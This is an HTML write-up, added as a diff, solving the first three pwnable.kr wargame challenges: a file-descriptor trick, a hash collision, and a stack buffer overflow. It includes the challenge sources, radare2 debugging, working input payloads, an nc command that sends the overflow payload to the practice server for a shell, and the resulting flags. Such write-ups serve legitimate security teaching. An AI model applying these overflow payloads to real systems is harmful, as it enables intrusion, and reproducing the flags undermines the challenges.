@@ -1,0 +1,350 @@
+<!DOCTYPE html>
+<html xmlns="http://www.w3.org/1999/xhtml" lang="" xml:lang="">
+<head>
+  <meta charset="utf-8" />
+  <meta name="generator" content="pandoc" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes" />
+  <title>Speedrun through the first few pwnable challenges</title>
+  <style type="text/css">
+      code{white-space: pre-wrap;}
+      span.smallcaps{font-variant: small-caps;}
+      span.underline{text-decoration: underline;}
+      div.column{display: inline-block; vertical-align: top; width: 50%;}
+  </style>
+  <style type="text/css">
+a.sourceLine { display: inline-block; line-height: 1.25; }
+a.sourceLine { pointer-events: none; color: inherit; text-decoration: inherit; }
+a.sourceLine:empty { height: 1.2em; }
+.sourceCode { overflow: visible; }
+code.sourceCode { white-space: pre; position: relative; }
+div.sourceCode { margin: 1em 0; }
+pre.sourceCode { margin: 0; }
+@media screen {
+div.sourceCode { overflow: auto; }
+}
+@media print {
+code.sourceCode { white-space: pre-wrap; }
+a.sourceLine { text-indent: -1em; padding-left: 1em; }
+}
+pre.numberSource a.sourceLine
+  { position: relative; left: -4em; }
+pre.numberSource a.sourceLine::before
+  { content: attr(data-line-number);
+    position: relative; left: -1em; text-align: right; vertical-align: baseline;
+    border: none; pointer-events: all; display: inline-block;
+    -webkit-touch-callout: none; -webkit-user-select: none;
+    -khtml-user-select: none; -moz-user-select: none;
+    -ms-user-select: none; user-select: none;
+    padding: 0 4px; width: 4em;
+    color: #aaaaaa;
+  }
+pre.numberSource { margin-left: 3em; border-left: 1px solid #aaaaaa;  padding-left: 4px; }
+div.sourceCode
+  {  }
+@media screen {
+a.sourceLine::before { text-decoration: underline; }
+}
+code span.al { color: #ff0000; } /* Alert */
+code span.an { color: #008000; } /* Annotation */
+code span.at { } /* Attribute */
+code span.bu { } /* BuiltIn */
+code span.cf { color: #0000ff; } /* ControlFlow */
+code span.ch { color: #008080; } /* Char */
+code span.cn { } /* Constant */
+code span.co { color: #008000; } /* Comment */
+code span.cv { color: #008000; } /* CommentVar */
+code span.do { color: #008000; } /* Documentation */
+code span.er { color: #ff0000; font-weight: bold; } /* Error */
+code span.ex { } /* Extension */
+code span.im { } /* Import */
+code span.in { color: #008000; } /* Information */
+code span.kw { color: #0000ff; } /* Keyword */
+code span.op { } /* Operator */
+code span.ot { color: #ff4000; } /* Other */
+code span.pp { color: #ff4000; } /* Preprocessor */
+code span.sc { color: #008080; } /* SpecialChar */
+code span.ss { color: #008080; } /* SpecialString */
+code span.st { color: #008080; } /* String */
+code span.va { } /* Variable */
+code span.vs { color: #008080; } /* VerbatimString */
+code span.wa { color: #008000; font-weight: bold; } /* Warning */
+  </style>
+  <link rel="stylesheet" href="/home/user/.local/share/markdown-css/github.css" />
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.2/MathJax.js?config=TeX-AMS_CHTML-full" type="text/javascript"></script>
+  <!--[if lt IE 9]>
+    <script src="//cdnjs.cloudflare.com/ajax/libs/html5shiv/3.7.3/html5shiv-printshiv.min.js"></script>
+  <![endif]-->
+</head>
+<body>
+<header>
+<h1 class="title">Speedrun through the first few pwnable challenges</h1>
+</header>
+<p>Write-up of the challenges at <a href="https://pwnable.kr" class="uri">https://pwnable.kr</a></p>
+<h2 id="challenge-1---fd">Challenge 1 - FD</h2>
+<p>This challenge is about file descriptors.<br />
+The explanation says:</p>
+<blockquote>
+<p>Mommy! what is a file descriptor in Linux?</p>
+</blockquote>
+<p>Then we are given only the command:</p>
+<blockquote>
+<p>ssh fd@pwnable.kr -p2222 (pw:guest)</p>
+</blockquote>
+<p>SSHing into the server and running ls -la gives us:</p>
+<pre class="console"><code>user@user:~$ ssh fd@pwnable.kr -p2222
+fd@pwnable.kr&#39;s password: 
+ ____  __    __  ____    ____  ____   _        ___      __  _  ____  
+|    \|  |__|  ||    \  /    ||    \ | |      /  _]    |  |/ ]|    \ 
+|  o  )  |  |  ||  _  ||  o  ||  o  )| |     /  [_     |  &#39; / |  D  )
+|   _/|  |  |  ||  |  ||     ||     || |___ |    _]    |    \ |    / 
+|  |  |  `  &#39;  ||  |  ||  _  ||  O  ||     ||   [_  __ |     \|    \ 
+|  |   \      / |  |  ||  |  ||     ||     ||     ||  ||  .  ||  .  \
+|__|    \_/\_/  |__|__||__|__||_____||_____||_____||__||__|\_||__|\_|
+                                                                     
+- Site admin : daehee87@gatech.edu
+- IRC : irc.netgarage.org:6667 / #pwnable.kr
+- Simply type &quot;irssi&quot; command to join IRC now
+- files under /tmp can be erased anytime. make your directory under /tmp
+- to use peda, issue `source /usr/share/peda/peda.py` in gdb terminal
+You have new mail.
+Last login: Fri Apr  2 13:44:10 2021 from X.X.X.X 
+fd@pwnable:~$ ls -la
+total 40
+drwxr-x---   5 root   fd   4096 Oct 26  2016 .
+drwxr-xr-x 115 root   root 4096 Dec 22 08:10 ..
+d---------   2 root   root 4096 Jun 12  2014 .bash_history
+-rw-------   1 root   root  128 Oct 26  2016 .gdb_history
+dr-xr-xr-x   2 root   root 4096 Dec 19  2016 .irssi
+drwxr-xr-x   2 root   root 4096 Oct 23  2016 .pwntools-cache
+-r-sr-x---   1 fd_pwn fd   7322 Jun 11  2014 fd
+-rw-r--r--   1 root   root  418 Jun 11  2014 fd.c
+-r--r-----   1 fd_pwn root   50 Jun 11  2014 flag
+fd@pwnable:~$ id
+uid=1002(fd) gid=1002(fd) groups=1002(fd)
+fd@pwnable:~$ </code></pre>
+<p>We can see that the flag file is owned by the user <code>fd_pawn</code> and group <code>root</code> and we are user <code>fd</code> and group <code>fd</code> and therefore don’t have permissions to read the flag file. However we have executable permission on the file fd and the set-uid flag is set with the owner being <code>fd_pawn</code>, we also have read access to the file <code>fd.c</code>, presumably the source code for the executable <code>fd</code>. Let’s have a look at fd.c:</p>
+<div class="sourceCode" id="cb2"><pre class="sourceCode c"><code class="sourceCode c"><a class="sourceLine" id="cb2-1" data-line-number="1"><span class="pp">#include </span><span class="im">&lt;stdio.h&gt;</span></a>
+<a class="sourceLine" id="cb2-2" data-line-number="2"><span class="pp">#include </span><span class="im">&lt;stdlib.h&gt;</span></a>
+<a class="sourceLine" id="cb2-3" data-line-number="3"><span class="pp">#include </span><span class="im">&lt;string.h&gt;</span></a>
+<a class="sourceLine" id="cb2-4" data-line-number="4"><span class="dt">char</span> buf[<span class="dv">32</span>];</a>
+<a class="sourceLine" id="cb2-5" data-line-number="5"><span class="dt">int</span> main(<span class="dt">int</span> argc, <span class="dt">char</span>* argv[], <span class="dt">char</span>* envp[]){</a>
+<a class="sourceLine" id="cb2-6" data-line-number="6">    <span class="cf">if</span>(argc&lt;<span class="dv">2</span>){</a>
+<a class="sourceLine" id="cb2-7" data-line-number="7">        printf(<span class="st">&quot;pass argv[1] a number</span><span class="sc">\n</span><span class="st">&quot;</span>);</a>
+<a class="sourceLine" id="cb2-8" data-line-number="8">        <span class="cf">return</span> <span class="dv">0</span>;</a>
+<a class="sourceLine" id="cb2-9" data-line-number="9">    }</a>
+<a class="sourceLine" id="cb2-10" data-line-number="10">    <span class="dt">int</span> fd = atoi( argv[<span class="dv">1</span>] ) - <span class="bn">0x1234</span>;</a>
+<a class="sourceLine" id="cb2-11" data-line-number="11">    <span class="dt">int</span> len = <span class="dv">0</span>;</a>
+<a class="sourceLine" id="cb2-12" data-line-number="12">    len = read(fd, buf, <span class="dv">32</span>);</a>
+<a class="sourceLine" id="cb2-13" data-line-number="13">    <span class="cf">if</span>(!strcmp(<span class="st">&quot;LETMEWIN</span><span class="sc">\n</span><span class="st">&quot;</span>, buf)){</a>
+<a class="sourceLine" id="cb2-14" data-line-number="14">        printf(<span class="st">&quot;good job :)</span><span class="sc">\n</span><span class="st">&quot;</span>);</a>
+<a class="sourceLine" id="cb2-15" data-line-number="15">        system(<span class="st">&quot;/bin/cat flag&quot;</span>);</a>
+<a class="sourceLine" id="cb2-16" data-line-number="16">        exit(<span class="dv">0</span>);</a>
+<a class="sourceLine" id="cb2-17" data-line-number="17">    }</a>
+<a class="sourceLine" id="cb2-18" data-line-number="18">    printf(<span class="st">&quot;learn about Linux file IO</span><span class="sc">\n</span><span class="st">&quot;</span>);</a>
+<a class="sourceLine" id="cb2-19" data-line-number="19">    <span class="cf">return</span> <span class="dv">0</span>;</a>
+<a class="sourceLine" id="cb2-20" data-line-number="20"></a>
+<a class="sourceLine" id="cb2-21" data-line-number="21">}</a></code></pre></div>
+<p>We can see it expects a number to be passed in. 0x1234 (Decimal: 4660) is then subtracted from this number. The result is then used as the file descriptor to read the file into buff. This is then compared to the string <code>&quot;LETMEWIN\n&quot;</code> and if it is a match the contents of the flag file are printed.</p>
+<p>Looking up POSIX file descriptors, 0 is the file descriptor value for standard input.</p>
+<p>So it looks like we need to execute fd with the number 4660 as the first argument and then pass the string <code>LETMEWIN</code> to the program via stdin.</p>
+<p>Doing this gives the following output:</p>
+<pre class="console"><code>fd@pwnable:~$ printf &#39;LETMEWIN\n&#39; | ./fd 4660
+good job :)
+mommy! I think I know what a file descriptor is!!
+fd@pwnable:~$ </code></pre>
+<p>And we can see that the contents of flag is:</p>
+<blockquote>
+<p>mommy! I think I know what a file descriptor is!!</p>
+</blockquote>
+<p>Entering this into the website confirms it is the correct flag.</p>
+<h2 id="challenge-2---collision">Challenge 2 - Collision</h2>
+<p>SSHing in and running <code>ls -la</code> and <code>id</code> we see it’s a very similar scenario as challenge 1:</p>
+<pre class="console"><code>user@user:~$ ssh col@pwnable.kr -p2222
+col@pwnable.kr&#39;s password: 
+ ____  __    __  ____    ____  ____   _        ___      __  _  ____  
+|    \|  |__|  ||    \  /    ||    \ | |      /  _]    |  |/ ]|    \ 
+|  o  )  |  |  ||  _  ||  o  ||  o  )| |     /  [_     |  &#39; / |  D  )
+|   _/|  |  |  ||  |  ||     ||     || |___ |    _]    |    \ |    / 
+|  |  |  `  &#39;  ||  |  ||  _  ||  O  ||     ||   [_  __ |     \|    \ 
+|  |   \      / |  |  ||  |  ||     ||     ||     ||  ||  .  ||  .  \
+|__|    \_/\_/  |__|__||__|__||_____||_____||_____||__||__|\_||__|\_|
+                                                                     
+- Site admin : daehee87@gatech.edu
+- IRC : irc.netgarage.org:6667 / #pwnable.kr
+- Simply type &quot;irssi&quot; command to join IRC now
+- files under /tmp can be erased anytime. make your directory under /tmp
+- to use peda, issue `source /usr/share/peda/peda.py` in gdb terminal
+You have mail.
+Last login: XXX XXX  X XX:XX:XX XXX from X.X.X.X
+col@pwnable:~$ ls -la
+total 36
+drwxr-x---   5 root    col     4096 Oct 23  2016 .
+drwxr-xr-x 115 root    root    4096 Dec 22 08:10 ..
+d---------   2 root    root    4096 Jun 12  2014 .bash_history
+dr-xr-xr-x   2 root    root    4096 Aug 20  2014 .irssi
+drwxr-xr-x   2 root    root    4096 Oct 23  2016 .pwntools-cache
+-r-sr-x---   1 col_pwn col     7341 Jun 11  2014 col
+-rw-r--r--   1 root    root     555 Jun 12  2014 col.c
+-r--r-----   1 col_pwn col_pwn   52 Jun 11  2014 flag
+col@pwnable:~$ id
+uid=1005(col) gid=1005(col) groups=1005(col)
+col@pwnable:~$ </code></pre>
+<p>So lets look at <code>col.c</code>:</p>
+<div class="sourceCode" id="cb5"><pre class="sourceCode c"><code class="sourceCode c"><a class="sourceLine" id="cb5-1" data-line-number="1"><span class="pp">#include </span><span class="im">&lt;stdio.h&gt;</span></a>
+<a class="sourceLine" id="cb5-2" data-line-number="2"><span class="pp">#include </span><span class="im">&lt;string.h&gt;</span></a>
+<a class="sourceLine" id="cb5-3" data-line-number="3"><span class="dt">unsigned</span> <span class="dt">long</span> hashcode = <span class="bn">0x21DD09EC</span>;</a>
+<a class="sourceLine" id="cb5-4" data-line-number="4"><span class="dt">unsigned</span> <span class="dt">long</span> check_password(<span class="dt">const</span> <span class="dt">char</span>* p){</a>
+<a class="sourceLine" id="cb5-5" data-line-number="5">    <span class="dt">int</span>* ip = (<span class="dt">int</span>*)p;</a>
+<a class="sourceLine" id="cb5-6" data-line-number="6">    <span class="dt">int</span> i;</a>
+<a class="sourceLine" id="cb5-7" data-line-number="7">    <span class="dt">int</span> res=<span class="dv">0</span>;</a>
+<a class="sourceLine" id="cb5-8" data-line-number="8">    <span class="cf">for</span>(i=<span class="dv">0</span>; i&lt;<span class="dv">5</span>; i++){</a>
+<a class="sourceLine" id="cb5-9" data-line-number="9">        res += ip[i];</a>
+<a class="sourceLine" id="cb5-10" data-line-number="10">    }</a>
+<a class="sourceLine" id="cb5-11" data-line-number="11">    <span class="cf">return</span> res;</a>
+<a class="sourceLine" id="cb5-12" data-line-number="12">}</a>
+<a class="sourceLine" id="cb5-13" data-line-number="13"></a>
+<a class="sourceLine" id="cb5-14" data-line-number="14"><span class="dt">int</span> main(<span class="dt">int</span> argc, <span class="dt">char</span>* argv[]){</a>
+<a class="sourceLine" id="cb5-15" data-line-number="15">    <span class="cf">if</span>(argc&lt;<span class="dv">2</span>){</a>
+<a class="sourceLine" id="cb5-16" data-line-number="16">        printf(<span class="st">&quot;usage : %s [passcode]</span><span class="sc">\n</span><span class="st">&quot;</span>, argv[<span class="dv">0</span>]);</a>
+<a class="sourceLine" id="cb5-17" data-line-number="17">        <span class="cf">return</span> <span class="dv">0</span>;</a>
+<a class="sourceLine" id="cb5-18" data-line-number="18">    }</a>
+<a class="sourceLine" id="cb5-19" data-line-number="19">    <span class="cf">if</span>(strlen(argv[<span class="dv">1</span>]) != <span class="dv">20</span>){</a>
+<a class="sourceLine" id="cb5-20" data-line-number="20">        printf(<span class="st">&quot;passcode length should be 20 bytes</span><span class="sc">\n</span><span class="st">&quot;</span>);</a>
+<a class="sourceLine" id="cb5-21" data-line-number="21">        <span class="cf">return</span> <span class="dv">0</span>;</a>
+<a class="sourceLine" id="cb5-22" data-line-number="22">    }</a>
+<a class="sourceLine" id="cb5-23" data-line-number="23"></a>
+<a class="sourceLine" id="cb5-24" data-line-number="24">    <span class="cf">if</span>(hashcode == check_password( argv[<span class="dv">1</span>] )){</a>
+<a class="sourceLine" id="cb5-25" data-line-number="25">        system(<span class="st">&quot;/bin/cat flag&quot;</span>);</a>
+<a class="sourceLine" id="cb5-26" data-line-number="26">        <span class="cf">return</span> <span class="dv">0</span>;</a>
+<a class="sourceLine" id="cb5-27" data-line-number="27">    }</a>
+<a class="sourceLine" id="cb5-28" data-line-number="28">    <span class="cf">else</span></a>
+<a class="sourceLine" id="cb5-29" data-line-number="29">        printf(<span class="st">&quot;wrong passcode.</span><span class="sc">\n</span><span class="st">&quot;</span>);</a>
+<a class="sourceLine" id="cb5-30" data-line-number="30">    <span class="cf">return</span> <span class="dv">0</span>;</a>
+<a class="sourceLine" id="cb5-31" data-line-number="31">}</a></code></pre></div>
+<p>First we see it expects 20 bytes to be passed as the first parameter. These 20 bytes are then passed to <code>check_password</code> and compared with the unsigned long <code>0x21DD09EC</code>. Looking at the <code>check_password</code> function we can see it divides the 20 bytes into 5 4-byte ints and then sums these 5 values.</p>
+<p>So we need to find 5 numbers which sum to 0x21DD09EC (Decimal: 568134124) we also need to make sure that the 32 bit signed integer representation of the 5 numbers contains no null bytes.</p>
+<p>Lets just take a guess and try 0x01010101. This is 16843009 in decimal, and:</p>
+<p><span class="math display">\[ 568134124 - (4*16843009) = 500762088 \]</span></p>
+<p>Converting 500762088 to hex we see it is 0x1DD905E8. No null bytes! These values should work.</p>
+<p>It does not matter what order we pass in the 5 4-byte blocks but the byte order of each block needs to be reversed. Executing col and passing in the byte array gives:</p>
+<pre class="console"><code>col@pwnable:~$ ./col $(printf &quot;%b&quot; &#39;\xE8\x05\xD9\x1D\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x0A&#39;)
+daddy! I just managed to create a hash collision :)
+col@pwnable:~$ </code></pre>
+<p>And we can see that the contents of flag is</p>
+<blockquote>
+<p>daddy! I just managed to create a hash collision :)</p>
+</blockquote>
+<p>Entering this into the website we are told it is correct.</p>
+<h2 id="challenge-3---buffer-overflow">Challenge 3 - Buffer Overflow</h2>
+<p>This challenge is obviously about exploiting a buffer overflow voulnrability. We are given two files to download, an executable and the source code and told it is running on <code>pwnable.kr:9000</code> Lets look at the source code <code>bof.c</code> first:</p>
+<div class="sourceCode" id="cb7"><pre class="sourceCode c"><code class="sourceCode c"><a class="sourceLine" id="cb7-1" data-line-number="1"><span class="pp">#include </span><span class="im">&lt;stdio.h&gt;</span></a>
+<a class="sourceLine" id="cb7-2" data-line-number="2"><span class="pp">#include </span><span class="im">&lt;string.h&gt;</span></a>
+<a class="sourceLine" id="cb7-3" data-line-number="3"><span class="pp">#include </span><span class="im">&lt;stdlib.h&gt;</span></a>
+<a class="sourceLine" id="cb7-4" data-line-number="4"><span class="dt">void</span> func(<span class="dt">int</span> key){</a>
+<a class="sourceLine" id="cb7-5" data-line-number="5">    <span class="dt">char</span> overflowme[<span class="dv">32</span>];</a>
+<a class="sourceLine" id="cb7-6" data-line-number="6">    printf(<span class="st">&quot;overflow me : &quot;</span>);</a>
+<a class="sourceLine" id="cb7-7" data-line-number="7">    gets(overflowme);   <span class="co">// smash me!</span></a>
+<a class="sourceLine" id="cb7-8" data-line-number="8">    <span class="cf">if</span>(key == <span class="bn">0xcafebabe</span>){</a>
+<a class="sourceLine" id="cb7-9" data-line-number="9">        system(<span class="st">&quot;/bin/sh&quot;</span>);</a>
+<a class="sourceLine" id="cb7-10" data-line-number="10">    }</a>
+<a class="sourceLine" id="cb7-11" data-line-number="11">    <span class="cf">else</span>{</a>
+<a class="sourceLine" id="cb7-12" data-line-number="12">        printf(<span class="st">&quot;Nah..</span><span class="sc">\n</span><span class="st">&quot;</span>);</a>
+<a class="sourceLine" id="cb7-13" data-line-number="13">    }</a>
+<a class="sourceLine" id="cb7-14" data-line-number="14">}</a>
+<a class="sourceLine" id="cb7-15" data-line-number="15"><span class="dt">int</span> main(<span class="dt">int</span> argc, <span class="dt">char</span>* argv[]){</a>
+<a class="sourceLine" id="cb7-16" data-line-number="16">    func(<span class="bn">0xdeadbeef</span>);</a>
+<a class="sourceLine" id="cb7-17" data-line-number="17">    <span class="cf">return</span> <span class="dv">0</span>;</a>
+<a class="sourceLine" id="cb7-18" data-line-number="18">}</a></code></pre></div>
+<p>The main function calls a function <code>func</code> with value <code>0xdeadbeef</code>, func then allocates 32 bytes on the stack and then reads from stdin into this buffer using the gets function. The value passed into func is then compared with the constant <code>0xcafebabe</code> and if it is equal executes a shell, otherwise it prints out <code>Nah..</code>. Gets will continue reading into memory until it reaches a null terminator so it looks like we need to input enough bytes so that gets reads in past the end of the 32 byte buffer and overwrites the key value (0xdeadbeef) with the value 0xcafebabe.</p>
+<p>Lets have a look at the compiled binary in radare to get a better idea of what is going on.</p>
+<p>Open the binary in radare2 in debugger mode using:</p>
+<pre class="console"><code>$ r2 -d bof
+Process with PID 7267 started...
+= attach 7267 7267
+bin.baddr 0x56623000
+Using 0x56623000
+asm.bits 32
+glibc.fc_offset = 0x00148</code></pre>
+<p>We the run <code>aaa</code> and <code>afl</code> to analyze the binary and list the functions. We can see the main and func functions so we will place breakpoints on these using the <code>db</code> command and then run the program with <code>dc</code>.</p>
+<pre class="console"><code>[0xf7fa7c70]&gt; aaa
+[x] Analyze all flags starting with sym. and entry0 (aa)
+[x] Analyze function calls (aac)
+[x] Analyze len bytes of instructions for references (aar)
+[x] Check for vtables
+[TOFIX: aaft can&#39;t run in debugger mode.ions (aaft)
+[x] Type matching analysis for all functions (aaft)
+[x] Propagate noreturn information
+[x] Use -AA or aaaa to perform additional experimental analysis.
+[0xf7fa7c70]&gt; afl
+0x56623530    1 49           entry0
+0x56623562    1 4            fcn.56623562
+0x56623520    1 6            sym.imp.__libc_start_main
+0x5662368a    1 28           main
+0x5662362c    6 94           sym.func
+0x56623570    8 128          sym.__do_global_dtors_aux
+0x566235f0    4 55           sym.frame_dummy
+0x56623627    1 4            sym.__i686.get_pc_thunk.bx
+0x56623730    4 56           sym.__do_global_ctors_aux
+0x56623720    1 2            sym.__libc_csu_fini
+0x56623768    1 26           sym._fini
+0x566236b0    4 97           sym.__libc_csu_init
+0x56623474    3 46           sym._init
+0x56623510    1 6            loc.imp.__gmon_start__
+0x566234c0    1 6            sym.imp.gets
+0x566234d0    1 6            sym.imp.__stack_chk_fail
+0x566234e0    1 6            sym.imp.__cxa_finalize
+0x566234f0    1 6            sym.imp.puts
+0x56623500    1 6            sym.imp.system
+[0xf7fa7c70]&gt; db main
+[0xf7fa7c70]&gt; db sym.func
+[0xf7fa7c70]&gt; dc
+hit breakpoint at: 0x5662368a
+[0x5662368a]&gt; </code></pre>
+<p>We can see we hit the breakpoint on the main function. Use <code>V!</code> to switch to visual mode:</p>
+<p><a href="01.png"><img src="01.png" title="radare2 Visual mode" /></a></p>
+<p>After stepping through and into the func function we can see both the 0xdeadbeef and return address have been pushed onto the stack.</p>
+<p><a href="02.png"><img src="02.png" title="Now at the start of the func function" /></a></p>
+<p>Stepping through some more, ebp is pushed onto the stack setting up the new stack frame and 48 is subtracted from esp, 12 for the 3 4-byte variables pushed onto the stack and 32 for the 32-byte buffer <code>overflowme</code>. Eventually we step over the system call to gets and we can see that it has been passed the memory address 0xff949dbc to begin reading in from stdin. Directly after the call to gets, we see the next instruction is a comparison between the variable <code>arg_8h</code> and the constant <code>0xcafebabe</code>.</p>
+<p><a href="03.png"><img src="03.png" title="Inspecting the values to be compared" /></a></p>
+<p>We can inspect the variable by running the following commands:</p>
+<pre class="console"><code>:&gt; afv
+var int32_t var_2ch @ ebp-0x2c
+var int32_t var_ch @ ebp-0xc
+arg int32_t arg_8h @ ebp+0x8
+:&gt; afvd arg_8h
+pf d @ebp+0x8
+:&gt; pf x @ebp+0x8
+0xfff91cc0 = 0xdeadbeef
+:&gt; </code></pre>
+<p>And subtracting the address of the <code>key</code> variable and the address passed to gets:</p>
+<pre class="console"><code>user@user:~$ python -c &#39;print(0xff949df0 - 0xff949dbc)&#39;
+52</code></pre>
+<p>We can see that they are 52 bytes apart. So in order to make the comparison return true we must send 52 bytes to stdin followed by the 4-byte value <code>0xcafebabe</code> in reverse byte order. Lets try it locally before attempting to send anything to the server. Create the payload:</p>
+<pre class="console"><code>$ python -c &#39;import sys; sys.stdout.buffer.write(b&quot;\x61&quot;*52+b&quot;\xbe\xba\xfe\xca\x0a&quot;)&#39; &gt; input.txt </code></pre>
+<p>And create a rarun2 profile file setting stdin to the <code>input.txt</code> file we just created:</p>
+<div class="sourceCode" id="cb13"><pre class="sourceCode bash"><code class="sourceCode bash"><a class="sourceLine" id="cb13-1" data-line-number="1"><span class="co">#!/usr/bin/env rarun2</span></a>
+<a class="sourceLine" id="cb13-2" data-line-number="2"><span class="va">stdin=</span>input.txt</a></code></pre></div>
+<p>Now we exit radare and restart it specifying the rr2 file:</p>
+<pre class="console"><code>$ r2 -e dbg.profile=input.rr2 -d bof</code></pre>
+<p>Now after stepping through the program we see gets has overwritten the stack beyond the 32 byte buffer and overwritten the <code>0xdeadbeef</code> value with <code>0xcafebabe</code></p>
+<p><a href="04.png"><img src="04.png" title="The stack has been overwritten with the payload from the input.txt file" /></a></p>
+<p>Executing the CMP instruction we see this time it now evaluates to true. Running the command <code>dr 1</code> we can see the zero flag is set and the JNE instruction does not jump and the syscall to execute the <code>/bin/sh</code> command is called.</p>
+<p><a href="05.png"><img src="05.png" title="The jump does not execute and the command to open a shell is called" /></a></p>
+<p>Looks good, now lets try sending the payload to the server location they gave (<code>pwnable.kr:9000</code>)</p>
+<pre class="console"><code>user@user:~$ cat input.txt - | nc pwnable.kr 9000
+ls -la
+total 15820
+drwxr-x---   3 root bof      4096 Oct 23  2016 .
+drwxr-xr-x 115 root root     4096 Dec 22 08:10 ..
+d---------   2 root root     4096 Jun 12  2014 .bash_history
+-r-xr-x---   1 root bof      7348 Sep 12  2016 bof
+-rw-r--r--   1 root root      308 Oct 23  2016 bof.c
+-r--r-----   1 root bof        32 Jun 11  2014 flag
+-rw-------   1 root root 16159015 Apr  3 02:21 log
+-rw-r--r--   1 root root        0 Oct 23  2016 log2
+-rwx------   1 root root      760 Sep 11  2014 super.pl
+cat flag
+daddy, I just pwned a buFFer :)</code></pre>
+<p>We successfully get a shell and can run <code>ls</code>. We see there is a file called <code>flag</code>, outputting the contents of this file gives <code>daddy, I just pwned a buFFer :)</code> and putting this into the website confirms this is the correct flag.</p>
+</body>
+</html>
